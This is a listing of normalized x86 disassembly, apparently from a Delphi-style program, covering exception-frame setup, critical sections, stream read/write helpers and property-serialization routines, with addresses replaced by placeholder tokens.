mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a60
jmp r-xdata
call sub_403a0c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_416aa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a14
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4189d3
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416c50
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a0c
call sub_403a60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a14
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403258
sub_418a40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418aea
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418abd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418cfc
cmp al 0xb
je r-xdata
mov eax ebx
call sub_410bfc
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_416d98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416dd0
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418af1
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b20
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_418b20
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4172c0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404098
mov eax esi
call j_sub_404474#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_4172c0
pop edx
pop esi
pop ebx
retn
sub_418b5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418c09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41729c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418c18
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404230
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c10
lea eax [ ebp - 0x8 ]
call sub_404688
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418cfc
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_4172c0
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045f4
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4172c0
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4172c0
jmp r-xdata
jmp r-xdata
call sub_416d98
sub_418c18
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418cef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41729c
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418b5c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047d4
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cf6
lea eax [ ebp - 0xc ]
call sub_403fa8
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418cfc
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4172c0
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4048d0
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_4172c0
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4172c0
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4045f4
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4172c0
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405a94
jmp r-xdata
jmp r-xdata
call sub_416d98
sub_418d10
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418d4c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418b20
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d53
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_418d58
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416f58
test al al
je r-xdata
mov eax [ ebx ]
call sub_418e0c
mov eax [ ebx ]
call sub_417ec4
pop ebx
pop ebp
retn
sub_418d80
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_4172c0
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419204
pop ebx
pop ecx
pop ebp
retn
sub_418db0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416f58
test al al
je r-xdata
mov eax [ ebx ]
call sub_41729c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_417ec4
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_419204
jmp r-xdata
mov eax [ ebx ]
call sub_418e0c
mov eax [ ebx ]
call sub_416f58
test al al
je r-xdata
mov eax [ ebx ]
call sub_418fa8
mov eax [ ebx ]
call sub_417ec4
sub_418e0c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418f9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418cfc
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418fa2
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
jmp [ eax * 4 + jump_table_418e43 ]
push ebp
call sub_418d58
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_419204
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_419204
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419204
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_419204
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b20
jmp r-xdata
push ebp
mov eax 0x1
call sub_418d80
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418d10
jmp r-xdata
push ebp
mov eax 0x1
call sub_418d80
pop ecx
jmp r-xdata
push ebp
call sub_418db0
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_419204
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419204
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419204
jmp r-xdata
push ebp
mov eax 0x2
call sub_418d80
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_419204
jmp r-xdata
push ebp
mov eax 0x1
call sub_418d80
pop ecx
sub_418fa8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418fe5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418b20
mov eax ebx
call sub_418e0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418fec
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_418ff0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_419088
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_416f58
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418b20
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_418b20
jmp r-xdata
mov eax ebx
call sub_418fa8
mov eax ebx
call sub_417ec4
jmp r-xdata
mov eax ebx
call sub_416f58
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_418ff0
mov eax ebx
call sub_417ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41908f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fcc
retn
sub_419098
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41913d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404040
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_419f34
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419144
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
sub_419168
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_419190
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_4171f0
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_4135e4
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403484
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_4171f0
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_419204
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_4172c0
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_4172c0
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41924c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4193f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_416e24
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4193d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_4172c0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415c20
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_4172c0
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4166e0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4193ab
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_418b5c
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_4172c0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415c20
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4172c0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_41089c
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
lea eax [ ebp - 0x1c ]
call sub_4056c4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d284
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193b2
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_419414
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41960e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40edf8
mov eax [ ebp - 0x4 ]
call sub_41729c
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
jmp [ eax * 4 + jump_table_419456 ]
mov eax [ ebp - 0x4 ]
call sub_418cfc
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e0c
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_4100d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e0c
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_4100d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e0c
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4100d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417bf0
mov eax ebx
call sub_410164
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c34
mov eax ebx
call sub_410164
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c78
mov eax ebx
call sub_41018c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417cc8
mov eax ebx
call sub_410178
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b5c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4101a0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_418c18
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4101cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418cfc
cmp al 0x9
sete dl
mov eax ebx
call sub_41013c
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41924c
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f120
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e78
push edx
push eax
mov eax ebx
call sub_410110
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419615
lea eax [ ebp - 0x1c ]
call sub_40ee0c
lea eax [ ebp - 0xc ]
call sub_404688
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov eax ebx
call sub_410984
jmp r-xdata
sub_41961c
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_419668
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_419694
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_419804
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41961c
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_419804
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41961c
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_419804
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41961c
jmp r-xdata
pop edx
pop ebx
retn
sub_419718
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4043b4
je r-xdata
mov eax esi
call sub_404268
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404268
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_419804
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41961c
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41961c
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_419804
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41961c
mov dl 0x6
mov eax ebx
call sub_419804
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41961c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41961c
sub_4197b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4197f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405b38
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_419718
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197fc
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_41988c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
call sub_419864
mov eax ebx
call sub_419870
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_419a1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4199fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a02
mov eax [ ebp - 0xc ]
call sub_403258
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413f44
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413e34
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4199c5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_419996
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_419a2c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419be4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_419a78
push ebx
push esi
push ecx
call sub_4035e4
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_419ccc
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419c74
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_4144d4
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_419c3c
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4035cc
lea eax [ ebx + 0x14 ]
call sub_40d250
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_413f44
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_419afc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413fa0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413de8
mov edx ebx
mov eax esi
call sub_419afc
sub_419b90
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413de8
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x10 ] eax
sub_419bbc
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_414088
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403258
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419be4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403454
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_419b90
mov dl 0x1
mov eax ebx
call sub_41a104
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41a0b4
sub_419c3c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41a104
mov edx ebx
mov eax esi
call sub_419bbc
pop edi
pop esi
pop ebx
retn
sub_419c74
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_41402c
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_419c3c
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_419bbc
sub_419ccc
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_413f44
call sub_419ccc
inc edi
dec esi
jne r-xdata
sub_419d08
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_414088
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403258
xor eax eax
mov [ ebx + 0x14 ] eax
sub_419d2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419d08
mov edx ebx
mov eax esi
call sub_419d08
pop esi
pop ebx
retn
sub_419d48
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_419d2c
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413f44
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_419da4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419b50
push ebx
push sub_419b78
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_419b64
push ebx
push sub_419b84
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
